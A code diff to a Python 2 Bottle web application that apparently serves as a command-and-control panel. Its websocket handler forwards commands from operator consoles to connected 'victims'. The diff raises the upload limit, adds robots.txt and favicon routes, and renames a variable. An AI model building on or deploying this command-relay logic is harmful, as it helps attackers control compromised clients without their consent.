@@ -23,7 +23,7 @@ from bottle import run, error, get, post,\
 	static_file, request, template, BaseRequest,\
 	response, redirect, abort, app
 
-BaseRequest.MEMFILE_MAX = 1024 * 1024
+BaseRequest.MEMFILE_MAX = 1024*1024*1024
 
 #Sqlite Sqldb
 auser = sqlite3.connect('./data/auser.db')
@@ -78,6 +78,8 @@ def b64ens(u):
     except TypeError:
         return b64encode(unicode(u))
 
+@get('/<filename:re:robots.txt>')
+@get('/<filename:re:favicon.ico>')
 @get('/static/<filename:path>')
 @post('/static/<filename:path>')
 def send_static(filename):
@@ -432,19 +434,19 @@ def cconnect(ws):
             print e
             break
         if cmdinfo is not None:
+            ur = unicode(ws)[-10:]
             try:
                 if lineor:
                     for v in victims[idsalt]:
                         v.send(cmdinfo)
                 else:
-                    u = unicode(ws)[-10:]
-                    consoles[idsalt].send(u + escape(cmdinfo))
+                    consoles[idsalt].send(ur + escape(cmdinfo))
             except KeyError as e:
                 consoles[idsalt].send(
                     escape('No User, {error}'.format(error=e)))
             except WebSocketError as e:
                 consoles[idsalt].send(
-                    escape(u + ' {error}'.format(error=e)))
+                    escape(ur + u' {error}'.format(error=e)))
         else: break
     ws.close()
 #    if lineor:
